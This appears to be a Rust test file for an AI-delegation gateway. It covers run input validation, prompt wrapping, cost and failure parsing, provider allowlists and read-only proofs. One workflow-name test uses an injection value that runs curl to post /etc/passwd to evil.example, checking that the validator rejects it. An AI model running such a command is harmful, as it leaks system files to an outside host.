//! Tests for the run domain: its input, the prompt and the summary, how the
//! answer and the cost are read, why a run failed, the OpenCode providers, the
//! run id and the read-only proof. Ported from the node runner's tests of the
//! same module, with the JavaScript string behaviour they rely on pinned too.

use crate::config::ModelPrices;
use crate::error::GatewayError;
use crate::json::{parse, Value};
use crate::run::*;
use crate::text::{is_js_whitespace, js_slice, js_trim, js_trim_start};

fn v(text: &str) -> Value {
    parse(text).expect("the test's JSON")
}

/// The error a call refused with.
fn refused<T: std::fmt::Debug>(result: Result<T, GatewayError>) -> GatewayError {
    result.expect_err("the call must refuse")
}

/// The input a test sends: the minimal one with `extra` members merged over it (a `null` removes one).
fn input(extra: &str) -> Value {
    let mut base = v(r#"{"client":"vibe","mode":"read-only","model":"zai-glm-5-3","prompt":"read this","workflow":"spec-293"}"#);
    let Value::Obj(object) = &mut base else { unreachable!() };
    for (key, value) in v(extra).as_object().expect("an object").entries() {
        if *value == Value::Null {
            object.remove(key);
        } else {
            object.set(key, value.clone());
        }
    }
    base
}

fn message(extra: &str) -> String {
    refused(read_run_input(&input(extra))).message
}

fn code(extra: &str) -> String {
    refused(read_run_input(&input(extra))).code
}

#[test]
fn reads_the_input_a_caller_sends_with_the_default_time_limit() {
    let read = read_run_input(&input("{}")).expect("minimal input");
    assert_eq!(
        read,
        RunInput {
            workflow: "spec-293".to_string(),
            client: "vibe".to_string(),
            model: "zai-glm-5-3".to_string(),
            mode: RunMode::ReadOnly,
            prompt: "read this".to_string(),
            repo: None,
            carries: None,
            time_limit_s: DEFAULT_TIME_LIMIT_S,
            max_price_usd: None,
            base: None,
            check: None,
            provider: None,
            escalate: None,
            family_binding: None,
            headless: None,
            max_attempts: None,
        }
    );
}

#[test]
fn reads_every_optional_field() {
    let read = read_run_input(&input(
        r#"{"carries":{"code":true,"history":false},"max_price_usd":0.5,"provider":"anthropic","repo":"/work/agent-kit","time_limit_s":60,
            "escalate":false,"family_binding":true,"headless":true,"max_attempts":2}"#,
    ))
    .expect("full input");
    assert_eq!(read.carries, Some(Carries { code: true, history: false }));
    assert_eq!(read.max_price_usd, Some(0.5));
    assert_eq!(read.provider.as_deref(), Some("anthropic"));
    assert_eq!(read.repo.as_deref(), Some("/work/agent-kit"));
    assert_eq!(read.time_limit_s, 60.0);
    assert_eq!((read.escalate, read.family_binding, read.headless, read.max_attempts), (Some(false), Some(true), Some(true), Some(2.0)));
}

#[test]
fn refuses_a_call_that_names_no_workflow() {
    assert_eq!(code(r#"{"workflow":""}"#), "invalid-input");
    assert_eq!(message(r#"{"workflow":null}"#), "a run must name its workflow");
}

#[test]
fn refuses_a_client_or_a_mode_a_later_ticket_builds() {
    assert_eq!(code(r#"{"client":"gemini"}"#), "not-supported-yet");
    assert_eq!(message(r#"{"client":"gemini"}"#), "only vibe, agy, claude, opencode, hermes, codex can run a delegation, not \"gemini\"");
    assert_eq!(message(r#"{"client":null}"#), "only vibe, agy, claude, opencode, hermes, codex can run a delegation, not missing");
    assert_eq!(message(r#"{"client":{"a":[1]}}"#), "only vibe, agy, claude, opencode, hermes, codex can run a delegation, not {\"a\":[1]}");
    assert_eq!(code(r#"{"mode":"writing"}"#), "not-supported-yet");
    assert_eq!(message(r#"{"mode":null}"#), "only read-only and write runs are supported, not missing");
    assert_eq!(message(r#"{"mode":7}"#), "only read-only and write runs are supported, not 7");
}

#[test]
fn reads_a_headless_run_and_refuses_a_headless_mark_that_is_not_true_or_false() {
    assert_eq!(read_run_input(&input(r#"{"headless":true}"#)).expect("headless").headless, Some(true));
    assert_eq!(read_run_input(&input("{}")).expect("plain").headless, None);
    assert_eq!(message(r#"{"headless":"yes"}"#), "headless must be true or false");
}

#[test]
fn refuses_escalation_marks_that_are_not_what_they_say() {
    assert_eq!(message(r#"{"escalate":"no"}"#), "escalate must be true or false");
    assert_eq!(message(r#"{"family_binding":1}"#), "family_binding must be true or false");
    assert_eq!(message(r#"{"max_attempts":1.5}"#), "max_attempts must be a whole number");
    assert_eq!(message(r#"{"max_attempts":0}"#), "max_attempts must be a whole number above 0");
    assert_eq!(read_run_input(&input(r#"{"max_attempts":1}"#)).expect("one attempt").max_attempts, Some(1.0));
}

#[test]
fn refuses_extras_from_the_command_line() {
    assert_eq!(message(r#"{"extras":{}}"#), "extras are for in-process callers only");
    let mut with_null = input("{}");
    let Value::Obj(object) = &mut with_null else { unreachable!() };
    object.set("extras", Value::Null);
    assert_eq!(refused(read_run_input(&with_null)).message, "extras are for in-process callers only");
}

#[test]
fn refuses_a_workflow_name_that_is_not_a_name() {
    for workflow in ["it's", "x'; curl http://evil.example -d @/etc/passwd; echo '"] {
        let text = crate::json::compact(&Value::str(workflow));
        assert_eq!(
            message(&format!(r#"{{"workflow":{text}}}"#)),
            format!("workflow {text} is not a workflow name: a letter or digit, then letters, digits and . _ : / @ - only, at most 80 characters")
        );
    }
    assert_eq!(code(&format!(r#"{{"workflow":"{}"}}"#, "a".repeat(81))), "invalid-input");
    assert_eq!(read_run_input(&input(r#"{"workflow":"spec-293/impl_2.1:codex"}"#)).expect("name").workflow, "spec-293/impl_2.1:codex");
}

#[test]
fn refuses_an_input_that_is_not_an_object_or_that_names_no_model_or_prompt() {
    assert_eq!(refused(read_run_input(&v("[]"))).message, "the input must be a JSON object");
    assert_eq!(message(r#"{"model":""}"#), "model must be a non-empty string");
    assert_eq!(message(r#"{"model":3}"#), "model must be a non-empty string");
    assert_eq!(message(r#"{"prompt":""}"#), "prompt must be a non-empty string");
    assert_eq!(message(r#"{"prompt":null}"#), "prompt must be a non-empty string");
}

#[test]
fn refuses_a_repo_a_carries_mark_a_time_limit_or_a_price_that_is_not_what_it_says() {
    assert_eq!(message(r#"{"repo":""}"#), "repo must be a non-empty string");
    assert_eq!(message(r#"{"repo":4}"#), "repo must be a non-empty string");
    assert_eq!(message(r#"{"carries":{"code":true}}"#), "carries must name code and history, each true or false");
    assert_eq!(message(r#"{"carries":[]}"#), "carries must name code and history, each true or false");
    assert_eq!(message(r#"{"carries":{"code":true,"history":1}}"#), "carries must name code and history, each true or false");
    assert_eq!(message(r#"{"time_limit_s":1.5}"#), "time_limit_s must be a whole number");
    assert_eq!(message(r#"{"time_limit_s":"9"}"#), "time_limit_s must be a whole number");
    assert_eq!(message(r#"{"time_limit_s":0}"#), "time_limit_s must be a whole number of seconds above 0");
    assert_eq!(message(r#"{"max_price_usd":0}"#), "max_price_usd must be a number above 0");
    assert_eq!(message(r#"{"max_price_usd":"1"}"#), "max_price_usd must be a number above 0");
    assert_eq!(message(r#"{"max_price_usd":1e999}"#), "max_price_usd must be a number above 0");
    assert_eq!(message(r#"{"provider":""}"#), "provider must be a non-empty string");
}

#[test]
fn reads_a_writing_run_with_its_base_and_check() {
    let read = read_run_input(&input(r#"{"base":"main","check":"npm test","mode":"write","repo":"/work/agent-kit"}"#)).expect("writing");
    assert_eq!((read.mode, read.base.as_deref(), read.check.as_deref(), read.repo.as_deref()), (RunMode::Write, Some("main"), Some("npm test"), Some("/work/agent-kit")));
}

#[test]
fn a_writing_run_needs_a_repository_first_then_a_base_and_a_check() {
    let writing = |without: &str| format!(r#"{{"base":"main","check":"npm test","mode":"write","repo":"/work/agent-kit",{without}}}"#);
    assert_eq!(code(&writing(r#""repo":null"#)), "write-needs-repository");
    assert_eq!(message(&writing(r#""repo":null"#)), "a writing run changes a repository, so it must name its repo");
    assert_eq!(message(&writing(r#""base":null"#)), "a writing run must name its base, a ref the worktree starts from");
    assert_eq!(message(&writing(r##""base":"""##)), "a writing run must name its base, a ref the worktree starts from");
    assert_eq!(message(&writing(r##""check":"""##)), "a writing run must name its check, a command that tests the change");
    assert_eq!(message(&writing(r#""check":5"#)), "a writing run must name its check, a command that tests the change");
}

#[test]
fn a_read_only_input_has_no_base_or_check_and_is_refused_when_it_names_them() {
    let read = read_run_input(&input("{}")).expect("read-only");
    assert_eq!((read.base, read.check), (None, None));
    assert_eq!(message(r#"{"base":"main"}"#), "base and check are for writing runs only");
    assert_eq!(code(r#"{"check":"npm test"}"#), "invalid-input");
}

#[test]
fn names_the_modes_and_clients() {
    assert_eq!((RunMode::ReadOnly.as_str(), RunMode::Write.as_str()), ("read-only", "write"));
    for (client, name) in RunClient::ALL.into_iter().zip(RUN_CLIENTS) {
        assert_eq!(client.as_str(), name);
        assert_eq!(RunClient::parse(name), Some(client));
    }
    assert_eq!(RunClient::parse("gemini"), None);
    assert_eq!(PROVIDER_CLIENTS, ["hermes"]);
    assert_eq!(FORBIDDEN_PROVIDERS, ["openrouter"]);
}

const SUMMARY: &str = "End your answer with a line \"SUMMARY:\" followed by at most 100 characters that summarise the result.";

#[test]
fn wraps_the_callers_prompt_with_the_instruction_that_ends_the_answer_with_a_summary_line() {
    assert_eq!(
        wrapped_prompt("read this", 1500.0, RunMode::ReadOnly, None),
        "read this\n\nEnd your answer with a line \"SUMMARY:\" followed by at most 1500 characters that summarise the result."
    );
}

#[test]
fn takes_the_text_after_the_last_summary_line_cut_at_the_limit() {
    assert_eq!(summary_of("work\nSUMMARY: it is fine", 1500.0), "it is fine");
    assert_eq!(summary_of("SUMMARY: first\nSUMMARY: second", 1500.0), "second");
    assert_eq!(summary_of("SUMMARY: 0123456789", 4.0), "0123");
}

#[test]
fn falls_back_to_the_last_characters_of_the_answer_when_the_delegate_wrote_no_summary_line() {
    assert_eq!(summary_of("0123456789", 4.0), "6789");
    // `slice(-n)` of an answer shorter than n is the whole answer, and a cut counts UTF-16 units.
    assert_eq!(summary_of("012", 4.0), "012");
    assert_eq!(summary_of("a\u{1F600}b", 2.0), "\u{FFFD}b");
    assert_eq!(summary_of("SUMMARY: \u{1F600}\u{1F600}", 3.0), "\u{1F600}\u{FFFD}");
}

#[test]
fn a_writing_prompt_says_where_the_delegate_may_edit_and_that_it_may_not_commit() {
    assert_eq!(wrapped_prompt("fix it", 100.0, RunMode::Write, None), format!("fix it\n\n{WRITE_RULE}\n\n{SUMMARY}"));
    assert_eq!(WRITE_RULE, "Edit only files inside the working directory. Do not commit.");
    assert!(!wrapped_prompt("fix it", 100.0, RunMode::ReadOnly, None).contains("commit"));
}

#[test]
fn a_codex_worker_is_told_it_commits_its_own_change() {
    let worker = Worker::default();
    assert_eq!(wrapped_prompt("fix it", 100.0, RunMode::Write, Some(&worker)), format!("fix it\n\n{CODEX_WRITE_RULE}\n\n{SUMMARY}"));
    assert_eq!(
        CODEX_WRITE_RULE,
        "Edit only files inside the working directory. When the change is done, commit it on the branch you are on with a Conventional Commits message. Never push."
    );
    let briefed = Worker { brief: Some("the brief".to_string()) };
    assert_eq!(wrapped_prompt("fix it", 100.0, RunMode::Write, Some(&briefed)), format!("the brief\n\n---\n\nfix it\n\n{CODEX_WRITE_RULE}\n\n{SUMMARY}"));
}

#[test]
fn a_worker_brief_that_is_empty_or_missing_adds_nothing() {
    let empty = Worker { brief: Some(String::new()) };
    assert_eq!(wrapped_prompt("fix it", 100.0, RunMode::Write, Some(&empty)), wrapped_prompt("fix it", 100.0, RunMode::Write, Some(&Worker::default())));
    assert!(!wrapped_prompt("fix it", 100.0, RunMode::Write, Some(&Worker::default())).contains("---"));
}

#[test]
fn a_worker_in_a_read_only_run_carries_no_brief_and_no_rule() {
    let briefed = Worker { brief: Some("the brief".to_string()) };
    assert_eq!(wrapped_prompt("read this", 100.0, RunMode::ReadOnly, Some(&briefed)), wrapped_prompt("read this", 100.0, RunMode::ReadOnly, None));
}

#[test]
fn final_answer_joins_the_last_assistant_message_of_a_vibe_journal() {
    let journal = r#"[
      {"content":[{"text":"first"}],"role":"assistant","type":"message"},
      {"content":[{"text":"the "},{"text":"answer"},{"other":1},"x"],"role":"assistant","type":"message"},
      {"content":[{"text":"a tool result"}],"role":"tool","type":"message"},
      "not an entry"
    ]"#;
    assert_eq!(final_answer_of(journal).as_deref(), Some("the answer"));
}

#[test]
fn final_answer_says_nothing_when_stdout_is_not_a_journal_or_holds_no_assistant_message_or_an_empty_one() {
    assert_eq!(final_answer_of("not json"), None);
    assert_eq!(final_answer_of(r#"{"type":"message"}"#), None);
    assert_eq!(final_answer_of(r#"[{"content":[{"text":"x"}],"role":"user","type":"message"}]"#), None);
    assert_eq!(final_answer_of(r#"[{"content":[],"role":"assistant","type":"message"}]"#), None);
    assert_eq!(final_answer_of(r#"[{"role":"assistant","type":"message"}]"#), None);
}

#[test]
fn one_shot_answer_is_what_the_client_printed_without_its_trailing_newline() {
    assert_eq!(one_shot_answer("the answer\n").as_deref(), Some("the answer"));
    assert_eq!(one_shot_answer(""), None);
    assert_eq!(one_shot_answer("  \n"), None);
}

#[test]
fn javascript_white_space_is_not_rusts() {
    assert!(is_js_whitespace('\u{feff}') && is_js_whitespace('\u{a0}') && is_js_whitespace('\u{2028}') && is_js_whitespace(' '));
    assert!(!is_js_whitespace('\u{85}') && !is_js_whitespace('x'));
    assert_eq!(js_trim("\u{feff} a \u{85}\n"), "a \u{85}");
    assert_eq!(js_trim_start("\u{a0}\n a "), "a ");
}

#[test]
fn slices_as_javascript_does() {
    assert_eq!(js_slice("0123456789", -4.0, None), "6789");
    assert_eq!(js_slice("0123456789", -0.0, None), "0123456789");
    assert_eq!(js_slice("0123456789", -40.0, None), "0123456789");
    assert_eq!(js_slice("0123456789", 2.7, Some(4.2)), "23");
    assert_eq!(js_slice("0123456789", f64::NAN, Some(2.0)), "01");
    assert_eq!(js_slice("0123456789", 3.0, Some(-3.0)), "3456");
    assert_eq!(js_slice("0123456789", 5.0, Some(2.0)), "");
    assert_eq!(js_slice("0123456789", 0.0, Some(f64::INFINITY)), "0123456789");
    assert_eq!(js_slice("0123456789", f64::NEG_INFINITY, Some(2.0)), "01");
}

#[test]
fn hermes_usage_reads_the_tokens_the_dollars_and_the_outcome() {
    let usage = hermes_usage(Some(&v(r#"{"cache_read_tokens":10,"estimated_cost_usd":0.0123,"failed":false,"input_tokens":100,"output_tokens":20}"#)));
    assert_eq!(usage, HermesUsage { cost: Some(0.0123), failed: false, tokens: RunTokens { cached: 10.0, input: 100.0, output: 20.0 } });
}

#[test]
fn hermes_usage_counts_nothing_for_a_report_that_holds_none_or_nonsense() {
    let nothing = HermesUsage { cost: None, failed: false, tokens: NO_TOKENS };
    assert_eq!(hermes_usage(None), nothing);
    assert_eq!(hermes_usage(Some(&v("[]"))), nothing);
    assert_eq!(hermes_usage(Some(&v(r#"{"estimated_cost_usd":null,"input_tokens":-1,"output_tokens":"many"}"#))), nothing);
    assert_eq!(hermes_usage(Some(&v(r#"{"estimated_cost_usd":-1}"#))), nothing);
}

#[test]
fn hermes_usage_says_the_run_failed_when_the_report_says_so_and_prices_a_free_run_at_nothing() {
    assert_eq!(hermes_usage(Some(&v(r#"{"estimated_cost_usd":0,"failed":true}"#))), HermesUsage { cost: Some(0.0), failed: true, tokens: NO_TOKENS });
}

#[test]
fn reads_the_exports_token_counts() {
    let tokens = run_tokens(Some(&v(r#"{"usage":{"cached_input_tokens":10,"input_tokens":100,"output_tokens":20}}"#)));
    assert_eq!(tokens, RunTokens { cached: 10.0, input: 100.0, output: 20.0 });
}

#[test]
fn counts_no_tokens_when_the_export_holds_none_or_nonsense() {
    assert_eq!(run_tokens(None), NO_TOKENS);
    assert_eq!(run_tokens(Some(&v("{}"))), NO_TOKENS);
    assert_eq!(run_tokens(Some(&v("3"))), NO_TOKENS);
    assert_eq!(run_tokens(Some(&v(r#"{"usage":{"input_tokens":-1,"output_tokens":"many"}}"#))), NO_TOKENS);
}

const PRICES: ModelPrices = ModelPrices { cached_input: 0.1, input: 1.0, output: 2.0 };

#[test]
fn takes_vibes_own_figure_when_it_priced_the_run() {
    let tokens = RunTokens { cached: 0.0, input: 1_000_000.0, output: 0.0 };
    assert_eq!(run_cost(Some(&v(r#"{"cost_usd":0.42}"#)), tokens, Some(&PRICES)), 0.42);
}

#[test]
fn counts_the_tokens_at_the_catalogue_price_when_vibe_priced_nothing() {
    let tokens = RunTokens { cached: 500_000.0, input: 1_000_000.0, output: 1_000_000.0 };
    assert!((run_cost(Some(&v("{}")), tokens, Some(&PRICES)) - (0.5 * 0.1 + 0.5 + 2.0)).abs() < 1e-10);
    assert_eq!(charged_of(Some(&v(r#"{"cost_usd":0}"#))), None);
    assert_eq!(charged_of(None), None);
}

#[test]
fn counts_nothing_when_nothing_prices_the_run() {
    assert_eq!(run_cost(Some(&v("{}")), RunTokens { cached: 0.0, input: 10.0, output: 10.0 }, None), 0.0);
}

#[test]
fn prices_a_run_by_the_clients_figure_then_the_catalogue_then_nothing() {
    assert_eq!(price_run(Some(0.42), RunTokens { cached: 0.0, input: 1_000_000.0, output: 0.0 }, Some(&PRICES)), 0.42);
    let priced = price_run(None, RunTokens { cached: 500_000.0, input: 1_000_000.0, output: 1_000_000.0 }, Some(&PRICES));
    assert!((priced - (0.5 * 0.1 + 0.5 + 2.0)).abs() < 1e-10);
    assert_eq!(price_run(None, RunTokens { cached: 0.0, input: 10.0, output: 10.0 }, None), 0.0);
    // More cached than input never prices a negative amount of fresh prompt.
    assert_eq!(price_run(None, RunTokens { cached: 10.0, input: 5.0, output: 0.0 }, Some(&PRICES)), 10.0 * 0.1 / 1_000_000.0);
}

fn exit(code: i32, stderr: &str) -> LaunchExit {
    LaunchExit { exit_code: code, timed_out: false, stderr: stderr.to_string() }
}

fn error(text: &str, status: Option<f64>) -> ClientReport {
    ClientReport { failure: None, error: Some(ClientError { text: text.to_string(), status }) }
}

fn failure(slug: &str) -> ClientReport {
    ClientReport { failure: Some(slug.to_string()), error: None }
}

fn reason(launch: &LaunchExit, answer: Option<&str>, reported: Option<&ClientReport>) -> Option<String> {
    run_failure_reason(launch, answer, reported)
}

#[test]
fn names_a_timeout_an_exit_code_or_an_answer_it_could_not_read() {
    assert_eq!(reason(&LaunchExit { exit_code: 124, timed_out: true, stderr: String::new() }, Some("text"), None).as_deref(), Some("timeout"));
    assert_eq!(reason(&exit(3, ""), Some("text"), None).as_deref(), Some("exit-3"));
    assert_eq!(reason(&exit(0, ""), None, None).as_deref(), Some("parse-error"));
    assert_eq!(reason(&exit(0, ""), Some("text"), None), None);
}

#[test]
fn names_what_the_client_reported_although_it_exited_0_after_a_timeout_or_an_exit_code_and_before_a_missing_answer() {
    assert_eq!(reason(&exit(0, ""), Some("text"), Some(&failure("denied-action"))).as_deref(), Some("denied-action"));
    assert_eq!(reason(&exit(0, ""), None, Some(&failure("client-error"))).as_deref(), Some("client-error"));
    assert_eq!(reason(&exit(3, ""), Some("text"), Some(&failure("client-error"))).as_deref(), Some("exit-3"));
    let timed_out = LaunchExit { exit_code: 0, timed_out: true, stderr: String::new() };
    assert_eq!(reason(&timed_out, Some("text"), Some(&failure("client-error"))).as_deref(), Some("timeout"));
}

#[test]
fn names_a_refusal_the_clients_own_error_channel_reported_before_its_exit_code() {
    assert_eq!(reason(&exit(1, "429 Too Many Requests"), None, None).as_deref(), Some("rate-limited"));
    assert_eq!(reason(&exit(1, ""), None, Some(&error("", Some(429.0)))).as_deref(), Some("rate-limited"));
    assert_eq!(reason(&exit(429, ""), None, None).as_deref(), Some("rate-limited"));
    assert_eq!(reason(&exit(1, ""), None, Some(&error("invalid api key", None))).as_deref(), Some("auth"));
    assert_eq!(reason(&exit(1, "boom"), None, Some(&error("boom", None))).as_deref(), Some("exit-1"));
    assert_eq!(reason(&exit(1, ""), None, Some(&error("", Some(401.0)))).as_deref(), Some("auth"));
    assert_eq!(reason(&exit(1, ""), None, Some(&error("", Some(403.0)))).as_deref(), Some("auth"));
    assert_eq!(reason(&exit(401, ""), None, None).as_deref(), Some("auth"));
    assert_eq!(reason(&exit(403, ""), None, None).as_deref(), Some("auth"));
    assert_eq!(reason(&exit(1, ""), None, Some(&ClientReport::default())).as_deref(), Some("exit-1"));
}

#[test]
fn reads_the_refusal_patterns_as_the_javascript_expressions_do() {
    let said = |stderr: &str| reason(&exit(1, stderr), None, None).unwrap_or_default();
    // rate.?limit: one optional character that is not a line terminator, ASCII case folded.
    for text in ["rate limit", "RateLimit", "rate-limited", "rate_limit", "rate\u{e9}limit", "Quota Exceeded", "quota reached", "RESOURCE_EXHAUSTED", "too many requests"] {
        assert_eq!(said(text), "rate-limited", "{text}");
    }
    for text in ["rate\nlimit", "rate\u{1F600}limit", "rate  limit", "quota  reached", "rat limit"] {
        assert_eq!(said(text), "exit-1", "{text}");
    }
    for text in ["Unauthorised", "unauthorized", "UNAUTHENTICATED", "not logged in", "login required", "log in required", "invalid api key", "authentication failed", "Forbidden"] {
        assert_eq!(said(text), "auth", "{text}");
    }
    for text in ["unauthorixed", "log  in required"] {
        assert_eq!(said(text), "exit-1", "{text}");
    }
    assert_eq!(said("This Go model IS HOSTED OUTSIDE Europe"), "model-unavailable");
    // A quota message names a model the account cannot use before it names a rate limit.
    assert_eq!(said("is hosted outside; rate limit"), "model-unavailable");
}

#[test]
fn names_a_quota_the_account_is_out_of_and_a_model_the_account_cannot_use_before_the_exit_code() {
    let quota = error("RESOURCE_EXHAUSTED: Individual quota reached. Resets in 29h2m9s", None);
    assert_eq!(reason(&exit(3, ""), None, Some(&quota)).as_deref(), Some("rate-limited"));
    let hosted = exit(1, "This Go model is hosted outside Europe and the United States. Select Global");
    assert_eq!(reason(&hosted, None, None).as_deref(), Some("model-unavailable"));
}

const AT: i64 = 1_793_789_535_000; // 2026-11-04T10:52:15Z

fn reset(stderr: &str, error: Option<&ClientError>) -> Option<String> {
    named_reset(&exit(1, stderr), error, AT).map(crate::timestamps::to_iso)
}

#[test]
fn names_the_moment_a_refusal_said_the_client_model_is_usable_again_measured_from_the_run() {
    assert_eq!(crate::timestamps::to_iso(AT), "2026-11-04T10:52:15.000Z");
    assert_eq!(reset("Individual quota reached. Resets in 29h2m9s", None).as_deref(), Some("2026-11-05T15:54:24.000Z"));
    let said = ClientError { text: "rate limited, resets in 30m12s".to_string(), status: None };
    assert_eq!(reset("", Some(&said)).as_deref(), Some("2026-11-04T11:22:27.000Z"));
    assert_eq!(reset("rate limit exceeded, try again", None), None);
    assert_eq!(reset("resets in 0h0m0s", None), None);
}

#[test]
fn reads_each_part_of_a_reset_on_its_own_and_only_the_first_reset() {
    assert_eq!(reset("Reset in 2h", None).as_deref(), Some("2026-11-04T12:52:15.000Z"));
    assert_eq!(reset("RESETS IN 45s", None).as_deref(), Some("2026-11-04T10:53:00.000Z"));
    assert_eq!(reset("resets in 5m", None).as_deref(), Some("2026-11-04T10:57:15.000Z"));
    assert_eq!(reset("resets in 1h30s", None).as_deref(), Some("2026-11-04T11:52:45.000Z"));
    // A part out of order is not read, nor is a number with no unit, nor a second reset after a first that names none.
    assert_eq!(reset("resets in 2m3h", None).as_deref(), Some("2026-11-04T10:54:15.000Z"));
    assert_eq!(reset("resets in 12 hours", None), None);
    assert_eq!(reset("resets in soon, resets in 5m", None), None);
    assert_eq!(reset("resetting in 5m, reset 5m, resets  in 5m", None), None);
    assert_eq!(reset("res", None), None);
    // A reset no `Date` can hold names no moment.
    assert_eq!(reset("resets in 99999999999999999999h", None), None);
}

#[test]
fn names_a_refusal_the_client_reported_although_it_exited_0_before_its_own_failure_slug() {
    let rate = ClientReport { failure: Some("client-error".to_string()), error: Some(ClientError { text: "rate limit exceeded".to_string(), status: Some(429.0) }) };
    assert_eq!(reason(&exit(0, ""), None, Some(&rate)).as_deref(), Some("rate-limited"));
    let auth = ClientReport { failure: Some("client-error".to_string()), error: Some(ClientError { text: "invalid api key".to_string(), status: None }) };
    assert_eq!(reason(&exit(0, ""), Some("text"), Some(&auth)).as_deref(), Some("auth"));
    assert_eq!(reason(&exit(0, ""), Some("text"), None), None);
}

#[test]
fn the_open_code_provider_is_the_part_before_the_first_slash_with_one_on_each_side() {
    assert_eq!(open_code_provider("opencode-go/glm-5-3"), Some("opencode-go"));
    assert_eq!(open_code_provider("openrouter/z-ai/glm-5"), Some("openrouter"));
    assert_eq!(open_code_provider("glm-5-3"), None);
    assert_eq!(open_code_provider("/glm-5-3"), None);
    assert_eq!(open_code_provider("opencode-go/"), None);
}

fn allowed(names: &[&str]) -> Vec<String> {
    names.iter().map(|name| name.to_string()).collect()
}

#[test]
fn a_provider_is_allowed_when_the_machine_names_it_and_by_default_only_opencode_go_is() {
    assert_eq!(require_allowed_provider("opencode-go/glm-5-3", None), Ok(()));
    assert_eq!(require_allowed_provider("zai/glm-5-3", Some(&allowed(&["zai"]))), Ok(()));
    assert_eq!(refused(require_allowed_provider("zai/glm-5-3", None)).code, "provider-not-allowed");
    assert_eq!(refused(require_allowed_provider("opencode-go/glm-5-3", Some(&allowed(&["zai"])))).code, "provider-not-allowed");
    assert_eq!(
        refused(require_allowed_provider("zai/glm-5-3", Some(&allowed(&["a", "b"])))).message,
        "zai/glm-5-3: the provider zai is not allowed (clients.opencode.providers: a, b), and OpenCode\u{2019}s pay-per-token models are never reached"
    );
    assert!(is_provider_allowed(Some("opencode-go"), None));
    assert!(!is_provider_allowed(None, None));
    assert!(!is_provider_allowed(Some("zai"), None));
}

#[test]
fn the_pay_per_token_provider_is_never_allowed_whatever_the_machine_names() {
    assert_eq!(refused(require_allowed_provider("opencode/glm-5-3", Some(&allowed(&["opencode", "opencode-go"])))).code, "provider-not-allowed");
    assert!(!is_provider_allowed(Some("opencode"), Some(&allowed(&["opencode"]))));
}

#[test]
fn a_model_that_names_no_provider_is_refused_with_the_form_it_needs() {
    assert_eq!(
        refused(require_allowed_provider("glm-5-3", None)).message,
        "glm-5-3: an OpenCode model is named <provider>/<model>, and the allowed providers are opencode-go"
    );
}

#[test]
fn the_run_id_is_the_utc_moment_the_run_started_and_a_short_suffix() {
    let at = crate::timestamps::parse("2026-11-04T10:52:15.123Z").expect("a moment");
    assert_eq!(compact_timestamp(at), "20261104T105215Z");
    assert_eq!(run_id(at, "a1b2c3"), "20261104T105215Z-a1b2c3");
}

const ROUTING: &str = r#"{"clients":{
  "agy-gemini-flash-high":{"kind":"agy","model":"gemini-3.8-flash-high"},
  "vibe-glm":{"kind":"vibe","model":"zai-glm-5-3"},
  "vibe-mistral-small":{"kind":"vibe","model":"mistral-small-latest"}}}"#;

fn files(routing: Option<&str>, routing_override: Option<&str>, setup_results: Option<&str>) -> ProofFiles {
    ProofFiles { routing: routing.map(str::to_string), routing_override: routing_override.map(str::to_string), setup_results: setup_results.map(str::to_string) }
}

fn results(result: &str, client: &str) -> String {
    format!(r#"{{"checks":{{"read-only:{client}":{{"result":"{result}"}}}},"version":1}}"#)
}

fn proven(critic: &str) -> ReadOnlyProof {
    ReadOnlyProof::Proven { critic: critic.to_string() }
}

fn unproven_because(reason: &str) -> ReadOnlyProof {
    ReadOnlyProof::Unproven { reason: reason.to_string() }
}

fn is_unproven(proof: ReadOnlyProof) -> bool {
    matches!(proof, ReadOnlyProof::Unproven { .. })
}

#[test]
fn the_proof_is_the_one_of_the_vibe_critic_client_whose_model_this_is() {
    let passed = results("pass", "vibe-glm");
    assert_eq!(read_only_proof(&files(Some(ROUTING), None, Some(&passed)), "zai-glm-5-3", &[], "vibe"), proven("vibe-glm"));
}

#[test]
fn finds_the_proof_of_an_alias_by_the_model_id_the_routing_names_among_its_names() {
    let passed = results("pass", "vibe-glm");
    let proof_files = files(Some(ROUTING), None, Some(&passed));
    assert_eq!(read_only_proof(&proof_files, "glm-5-3", &["zai-glm-5-3"], "vibe"), proven("vibe-glm"));
    assert!(is_unproven(read_only_proof(&proof_files, "glm-5-3", &[], "vibe")));
}

#[test]
fn is_unproven_when_critiques_routing_is_not_installed_or_is_not_json() {
    assert_eq!(
        read_only_proof(&files(None, None, None), "zai-glm-5-3", &[], "vibe"),
        unproven_because("critique's routing is not installed, so no Vibe critic client proves a model read-only")
    );
    assert!(is_unproven(read_only_proof(&files(Some("not json"), None, None), "zai-glm-5-3", &[], "vibe")));
    assert!(is_unproven(read_only_proof(&files(Some("[]"), None, None), "zai-glm-5-3", &[], "vibe")));
}

#[test]
fn is_unproven_when_no_vibe_critic_client_runs_the_model() {
    let passed = results("pass", "vibe-glm");
    assert_eq!(
        read_only_proof(&files(Some(ROUTING), None, Some(&passed)), "mistral-large-4-0", &[], "vibe"),
        unproven_because("no Vibe critic client in critique's routing runs mistral-large-4-0")
    );
    assert!(is_unproven(read_only_proof(&files(Some(ROUTING), None, None), "gemini-3.8-flash-high", &[], "vibe")));
}

#[test]
fn is_unproven_when_setup_recorded_no_proof_a_failed_one_or_one_it_could_not_show() {
    assert_eq!(
        read_only_proof(&files(Some(ROUTING), None, None), "zai-glm-5-3", &[], "vibe"),
        unproven_because("setup's read-only proof for vibe-glm is not recorded")
    );
    let failed = results("fail", "vibe-glm");
    assert!(is_unproven(read_only_proof(&files(Some(ROUTING), None, Some(&failed)), "zai-glm-5-3", &[], "vibe")));
    let shown = results("unproven", "vibe-glm");
    assert_eq!(
        read_only_proof(&files(Some(ROUTING), None, Some(&shown)), "zai-glm-5-3", &[], "vibe"),
        unproven_because("setup's read-only proof for vibe-glm is unproven")
    );
    for odd in ["not json", r#"{"checks":[]}"#, r#"{"checks":{"read-only:vibe-glm":3}}"#, r#"{"checks":{"read-only:vibe-glm":{"result":4}}}"#] {
        assert!(is_unproven(read_only_proof(&files(Some(ROUTING), None, Some(odd)), "zai-glm-5-3", &[], "vibe")), "{odd}");
    }
}

#[test]
fn follows_this_machines_routing_override_which_may_move_a_client_to_another_model() {
    let over = r#"{"clients":{"vibe-glm":{"model":"zai-glm-6-0"}}}"#;
    let passed = results("pass", "vibe-glm");
    let proof_files = files(Some(ROUTING), Some(over), Some(&passed));
    assert_eq!(read_only_proof(&proof_files, "zai-glm-6-0", &[], "vibe"), proven("vibe-glm"));
    assert!(is_unproven(read_only_proof(&proof_files, "zai-glm-5-3", &[], "vibe")));
}

#[test]
